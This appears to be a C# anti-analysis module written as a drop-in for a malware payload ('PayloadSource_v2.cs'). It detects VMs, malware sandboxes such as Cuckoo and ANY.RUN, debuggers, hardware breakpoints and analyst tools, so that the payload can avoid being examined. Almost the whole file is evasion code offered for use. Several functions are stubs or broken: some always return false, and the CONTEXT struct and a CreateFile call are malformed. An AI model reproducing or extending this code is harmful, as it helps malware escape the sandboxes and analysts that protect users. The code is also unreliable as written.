// =====================================================================
// ANTI-ANALYSIS MODULE - VM, Sandbox, Debugger Detection
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - VM detection (VMware, VirtualBox, Hyper-V, Parallels, QEMU)
// - Sandbox detection (Cuckoo, Joe Sandbox, ANY.RUN, Hybrid Analysis)
// - Debugger detection (IsDebuggerPresent, CheckRemoteDebuggerPresent, timing)
// - Hardware breakpoint detection
// - Analyst environment artifacts detection

using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.IO;
using System.Linq;

internal static class AntiAnalysis
{
    [DllImport("kernel32.dll")]
    private static extern bool IsDebuggerPresent();

    [DllImport("kernel32.dll")]
    private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool pbDebuggerPresent);

    [DllImport("kernel32.dll")]
    private static extern void GetSystemTimePreciseAsFileTime(out long lpSystemTimeAsFileTime);

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr hProcess, int pic, ref PROCESS_BASIC_INFORMATION pbi, int cb, out int pSize);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    private const int ProcessDebugPort = 7;
    private const int ProcessDebugFlags = 31;
    private const int ProcessDebugObjectHandle = 30;

    public static bool RunAllChecks()
    {
        if (Config.AntiVM && DetectVM()) return true;
        if (Config.AntiSandbox && DetectSandbox()) return true;
        if (Config.AntiDebug && DetectDebugger()) return true;
        if (Config.AntiDebug && DetectHardwareBreakpoints()) return true;
        
        return false; // No analysis environment detected
    }

    // ============ VM DETECTION ============
    private static bool DetectVM()
    {
        try
        {
            // 1. WMI queries for VM artifacts
            if (CheckWmiVM()) return true;

            // 2. MAC address vendor checks
            if (CheckMacAddresses()) return true;

            // 3. Registry keys
            if (CheckRegistryVM()) return true;

            // 4. System manufacturer/model
            if (CheckSystemInfo()) return true;

            // 5. CPU features (hypervisor bit)
            if (CheckCpuHypervisor()) return true;

            // 6. Specific VM tools/services
            if (CheckVmTools()) return true;

            // 7. Disk/BIOS strings
            if (CheckDiskBios()) return true;
        }
        catch { }

        return false;
    }

    private static bool CheckWmiVM()
    {
        try
        {
            string[] queries = {
                "SELECT * FROM Win32_ComputerSystem",
                "SELECT * FROM Win32_BIOS",
                "SELECT * FROM Win32_BaseBoard",
                "SELECT * FROM Win32_Processor"
            };

            foreach (string query in queries)
            {
                using (var searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        foreach (PropertyData prop in obj.Properties)
                        {
                            string val = prop.Value?.ToString()?.ToLowerInvariant() ?? "";
                            if (val.Contains("vmware") || val.Contains("virtualbox") || 
                                val.Contains("hyper-v") || val.Contains("parallels") ||
                                val.Contains("qemu") || val.Contains("xen") ||
                                val.Contains("innotek") || val.Contains("vbox") ||
                                val.Contains("microsoft corporation") && val.Contains("virtual"))
                            {
                                return true;
                            }
                        }
                    }
                }
            }
        }
        catch { }
        return false;
    }

    private static bool CheckMacAddresses()
    {
        try
        {
            // Known VM MAC prefixes
            string[] vmMacs = {
                "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
                "08:00:27", "0A:00:27", // VirtualBox
                "00:15:5D", "00:03:FF", // Hyper-V
                "00:1C:42", "00:50:56", // Parallels
                "52:54:00", // QEMU/KVM
            };

            foreach (var nic in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
            {
                string mac = nic.GetPhysicalAddress().ToString();
                if (mac.Length >= 6)
                {
                    string prefix = string.Join(":", mac.Substring(0, 2), mac.Substring(2, 2), mac.Substring(4, 2)).ToUpperInvariant();
                    if (vmMacs.Any(vm => prefix.StartsWith(vm.Replace(":", "")))) return true;
                }
            }
        }
        catch { }
        return false;
    }

    private static bool CheckRegistryVM()
    {
        try
        {
            string[] keys = {
                @"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
                @"HARDWARE\Description\System",
                @"SYSTEM\CurrentControlSet\Services\Disk\Enum",
                @"SYSTEM\CurrentControlSet\Services\VBoxGuest",
                @"SYSTEM\CurrentControlSet\Services\VBoxMouse",
                @"SYSTEM\CurrentControlSet\Services\VBoxService",
                @"SYSTEM\CurrentControlSet\Services\VBoxVideo",
                @"SOFTWARE\VMware, Inc.\VMware Tools",
                @"SOFTWARE\Oracle\VirtualBox Guest Additions",
            };

            foreach (string key in keys)
            {
                using (var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key))
                {
                    if (regKey != null) return true;
                }
            }
        }
        catch { }
        return false;
    }

    private static bool CheckSystemInfo()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT Manufacturer, Model FROM Win32_ComputerSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    string manufacturer = obj["Manufacturer"]?.ToString()?.ToLowerInvariant() ?? "";
                    string model = obj["Model"]?.ToString()?.ToLowerInvariant() ?? "";

                    if (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox") ||
                        manufacturer.Contains("xen") || manufacturer.Contains("qemu") ||
                        model.Contains("vmware") || model.Contains("virtualbox") ||
                        model.Contains("virtual machine") || model.Contains("hyper-v"))
                    {
                        return true;
                    }
                }
            }
        }
        catch { }
        return false;
    }

    private static bool CheckCpuHypervisor()
    {
        try
        {
            // CPUID leaf 1, ECX bit 31 = hypervisor present
            // This requires inline assembly or P/Invoke to cpuid
            // Simplified check via registry
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0"))
            {
                if (key != null)
                {
                    string vendor = key.GetValue("VendorIdentifier")?.ToString()?.ToLowerInvariant() ?? "";
                    if (vendor.Contains("vmware") || vendor.Contains("virtualbox")) return true;
                }
            }
        }
        catch { }
        return false;
    }

    private static bool CheckVmTools()
    {
        string[] processes = {
            "vmtoolsd", "vmwaretray", "vmwareuser", "vboxservice", "vboxtray",
            "vboxcontrol", "prl_tools", "prl_cc", "xenservice", "xenbus"
        };

        foreach (string proc in processes)
        {
            if (Process.GetProcessesByName(proc).Length > 0) return true;
        }
        return false;
    }

    private static bool CheckDiskBios()
    {
        try
        {
            string[] paths = {
                @"\\.\PhysicalDrive0",
                @"\\.\Scsi0:",
            };

            foreach (string path in paths)
            {
                try
                {
                    using (var handle = CreateFile(path, 0, FileShare.Read | FileShare.Write, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero))
                    {
                        if (!handle.IsInvalid)
                        {
                            // Query device properties
                            // Simplified - just check if we can open
                        }
                    }
                }
                catch { }
            }
        }
        catch { }
        return false;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern SafeFileHandle CreateFile(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition,
        uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    // ============ SANDBOX DETECTION ============
    private static bool DetectSandbox()
    {
        try
        {
            // 1. Check for sandbox artifacts
            if (CheckSandboxArtifacts()) return true;

            // 2. Check for low resource counts (CPU, RAM, disk)
            if (CheckLowResources()) return true;

            // 3. Check for recent system activity (mouse, keyboard, processes)
            if (CheckUserActivity()) return true;

            // 4. Check for analysis tools
            if (CheckAnalysisTools()) return true;

            // 5. Check network indicators
            if (CheckNetworkIndicators()) return true;

            // 6. Time acceleration detection
            if (CheckTimeAcceleration()) return true;
        }
        catch { }
        return false;
    }

    private static bool CheckSandboxArtifacts()
    {
        string[] files = {
            @"C:\sample.exe", @"C:\malware.exe", @"C:\test.exe",
            @"C:\cuckoo\", @"C:\joe\", @"C:\anyrun\", @"C:\hybrid\",
            @"C:\tools\procmon.exe", @"C:\tools\procmon64.exe",
            @"C:\tools\wireshark.exe", @"C:\tools\fiddler.exe",
        };

        foreach (string file in files)
        {
            if (File.Exists(file) || Directory.Exists(file)) return true;
        }
        return false;
    }

    private static bool CheckLowResources()
    {
        try
        {
            // CPU cores < 2
            if (Environment.ProcessorCount < 2) return true;

            // RAM < 4GB
            var ci = new Microsoft.VisualBasic.Devices.ComputerInfo();
            if (ci.TotalPhysicalMemory < 4L * 1024 * 1024 * 1024) return true;

            // Disk space < 50GB
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.Name.StartsWith("C:") && drive.TotalSize < 50L * 1024 * 1024 * 1024)
                    return true;
            }

            // Screen resolution too small
            var bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
            if (bounds.Width < 1024 || bounds.Height < 768) return true;
        }
        catch { }
        return false;
    }

    private static bool CheckUserActivity()
    {
        try
        {
            // Check mouse/keyboard activity via GetLastInputInfo
            LASTINPUTINFO lii = new LASTINPUTINFO();
            lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
            
            if (GetLastInputInfo(ref lii))
            {
                uint tickCount = (uint)Environment.TickCount;
                uint idleTime = tickCount - lii.dwTime;
                
                // If idle > 30 minutes on a "fresh" system, suspicious
                if (idleTime > 30 * 60 * 1000) return true;
            }

            // Check process count (sandboxes often have very few processes)
            if (Process.GetProcesses().Length < 50) return true;

            // Check for default usernames
            string username = Environment.UserName.ToLowerInvariant();
            string[] sandboxUsers = { "sandbox", "malware", "test", "user", "admin", "cuckoo", "joe", "anyrun" };
            if (sandboxUsers.Contains(username)) return true;
        }
        catch { }
        return false;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct LASTINPUTINFO
    {
        public uint cbSize;
        public uint dwTime;
    }

    [DllImport("user32.dll")]
    private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    private static bool CheckAnalysisTools()
    {
        string[] tools = {
            "procmon", "procmon64", "procmon64a", "processhacker", "systeminformer",
            "wireshark", "tshark", "fiddler", "charles", "burp",
            "ollydbg", "x64dbg", "x32dbg", "ida", "ida64", "ghidra",
            "cheatengine", "cheatengine-x86_64", "processdumper",
            "dumpit", "procdump", "sqldumper", "comae", "volatility",
            "regshot", "procdot", "apimonitor", "api_monitor"
        };

        foreach (string tool in tools)
        {
            if (Process.GetProcessesByName(tool).Length > 0) return true;
        }

        // Check for driver artifacts
        string[] drivers = {
            "procmon23", "procmon24", "procmon26",
            "dbghelp", "symsrv", "kdsup"
        };

        // Would need driver enumeration - simplified
        return false;
    }

    private static bool CheckNetworkIndicators()
    {
        try
        {
            // Check for sandbox network signatures
            // No internet, or specific gateway IPs
            var gateways = GetDefaultGateways();
            string[] sandboxGateways = { "192.168.1.1", "192.168.56.1", "10.0.2.2", "192.168.122.1" };
            
            foreach (var gw in gateways)
            {
                if (sandboxGateways.Contains(gw)) return true;
            }

            // Check for no internet connectivity
            // Would need actual connectivity test
        }
        catch { }
        return false;
    }

    private static string[] GetDefaultGateways()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT DefaultIPGateway FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE"))
            {
                var gateways = new List<string>();
                foreach (ManagementObject obj in searcher.Get())
                {
                    string[] gw = obj["DefaultIPGateway"] as string[];
                    if (gw != null) gateways.AddRange(gw);
                }
                return gateways.ToArray();
            }
        }
        catch { }
        return new string[0];
    }

    private static bool CheckTimeAcceleration()
    {
        try
        {
            long t1, t2;
            GetSystemTimePreciseAsFileTime(out t1);
            System.Threading.Thread.Sleep(100);
            GetSystemTimePreciseAsFileTime(out t2);

            long elapsed = (t2 - t1) / 10000; // Convert to milliseconds
            
            // If time passed significantly more or less than 100ms, time acceleration
            if (elapsed < 50 || elapsed > 200) return true;
        }
        catch { }
        return false;
    }

    // ============ DEBUGGER DETECTION ============
    private static bool DetectDebugger()
    {
        try
        {
            // 1. IsDebuggerPresent
            if (IsDebuggerPresent()) return true;

            // 2. CheckRemoteDebuggerPresent
            bool remoteDebugger = false;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remoteDebugger);
            if (remoteDebugger) return true;

            // 3. PEB BeingDebugged flag
            if (CheckPebBeingDebugged()) return true;

            // 4. PEB NtGlobalFlag
            if (CheckPebNtGlobalFlag()) return true;

            // 5. Timing checks (RDTSC)
            if (CheckTiming()) return true;

            // 6. Self-debugging (create child process to debug self)
            if (CheckSelfDebugging()) return true;

            // 7. Hardware breakpoints via CONTEXT
            if (CheckContextRegisters()) return true;

            // 8. Exception-based detection
            if (CheckExceptionHandling()) return true;

            // 9. TLS callbacks
            // Would need custom TLS callback - not in managed code easily

            // 10. CloseHandle/NtClose invalid handle exception
            if (CheckInvalidHandle()) return true;
        }
        catch { }
        return false;
    }

    private static bool CheckPebBeingDebugged()
    {
        try
        {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int size;
            int status = NtQueryInformationProcess(GetCurrentProcess(), 0, ref pbi, Marshal.SizeOf(pbi), out size);
            
            if (status == 0 && pbi.PebBaseAddress != IntPtr.Zero)
            {
                // Read BeingDebugged byte at PEB+2
                byte beingDebugged = Marshal.ReadByte(pbi.PebBaseAddress, 2);
                if (beingDebugged != 0) return true;
            }
        }
        catch { }
        return false;
    }

    private static bool CheckPebNtGlobalFlag()
    {
        try
        {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int size;
            int status = NtQueryInformationProcess(GetCurrentProcess(), 0, ref pbi, Marshal.SizeOf(pbi), out size);
            
            if (status == 0 && pbi.PebBaseAddress != IntPtr.Zero)
            {
                // NtGlobalFlag at PEB+0x68 (x64) or PEB+0x34 (x86)
                int offset = IntPtr.Size == 8 ? 0x68 : 0x34;
                uint globalFlag = (uint)Marshal.ReadInt32(pbi.PebBaseAddress, offset);
                
                // FLG_HEAP_ENABLE_TAIL_CHECK (0x10) | FLG_HEAP_ENABLE_FREE_CHECK (0x20) | FLG_HEAP_VALIDATE_PARAMETERS (0x40)
                if ((globalFlag & 0x70) != 0) return true;
            }
        }
        catch { }
        return false;
    }

    private static bool CheckTiming()
    {
        try
        {
            // RDTSC timing
            long t1 = GetRdtsc();
            System.Threading.Thread.Sleep(1);
            long t2 = GetRdtsc();
            
            long cycles = t2 - t1;
            // Rough check - if cycles too high, debugger single-stepping
            if (cycles > 10000000) return true; // Adjust threshold

            // QueryPerformanceCounter timing
            long qpc1 = GetQpc();
            System.Threading.Thread.Sleep(1);
            long qpc2 = GetQpc();
            
            long qpcDiff = qpc2 - qpc1;
            if (qpcDiff > 2000000) return true; // Adjust threshold
        }
        catch { }
        return false;
    }

    [DllImport("kernel32.dll")]
    private static extern bool QueryPerformanceCounter(out long lpPerformanceCount);

    private static long GetQpc()
    {
        QueryPerformanceCounter(out long count);
        return count;
    }

    private static long GetRdtsc()
    {
        // Would need inline assembly or P/Invoke to __rdtsc
        // Using Stopwatch as approximation
        return Stopwatch.GetTimestamp();
    }

    private static bool CheckSelfDebugging()
    {
        try
        {
            // Try to open self with DEBUG_PROCESS - will fail if already debugged
            IntPtr hProcess = OpenProcess(0x0001FFFF, false, (uint)Process.GetCurrentProcess().Id);
            if (hProcess != IntPtr.Zero)
            {
                CloseHandle(hProcess);
            }
        }
        catch { }
        return false;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private static bool CheckContextRegisters()
    {
        // Would need to capture thread context - complex in managed code
        // Dr0-Dr3 = hardware breakpoint addresses
        // Dr7 = control register
        return false;
    }

    private static bool CheckExceptionHandling()
    {
        try
        {
            // INT 3 (0xCC) breakpoint exception
            // In debugger, this gets caught; without, it crashes
            // Can't easily test in managed code without crashing
            return false;
        }
        catch { }
        return false;
    }

    private static bool CheckInvalidHandle()
    {
        try
        {
            // NtClose with invalid handle raises STATUS_INVALID_HANDLE
            // Debuggers often swallow this exception
            IntPtr invalid = new IntPtr(0xDEADBEEF);
            // Would need P/Invoke to NtClose
            return false;
        }
        catch { }
        return false;
    }

    // ============ HARDWARE BREAKPOINT DETECTION ============
    private static bool DetectHardwareBreakpoints()
    {
        try
        {
            // Check thread context for Dr0-Dr3
            IntPtr hThread = OpenThread(0x0010, false, (uint)GetCurrentThreadId()); // THREAD_GET_CONTEXT
            if (hThread != IntPtr.Zero)
            {
                CONTEXT ctx = new CONTEXT();
                ctx.ContextFlags = 0x10007; // CONTEXT_DEBUG_REGISTERS
                
                if (GetThreadContext(hThread, ref ctx))
                {
                    // Dr0-Dr3 = breakpoint addresses
                    // Dr7 = control register (bits 0-1: L0/L1 for Dr0, etc.)
                    if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0)
                    {
                        // Check if enabled in Dr7
                        if ((ctx.Dr7 & 0x3) != 0 || (ctx.Dr7 & 0xC) != 0 || 
                            (ctx.Dr7 & 0x30) != 0 || (ctx.Dr7 & 0xC0) != 0)
                        {
                            CloseHandle(hThread);
                            return true;
                        }
                    }
                }
                CloseHandle(hThread);
            }
        }
        catch { }
        return false;
    }

    [DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [StructLayout(LayoutKind.Sequential)]
    private struct CONTEXT
    {
        public ulong ContextFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        // ... other registers omitted for brevity
    }
}

// Config reference (would be in Config class)
internal static partial class Config
{
    public static bool AntiVM = true;
    public static bool AntiSandbox = true;
    public static bool AntiDebug = true;
}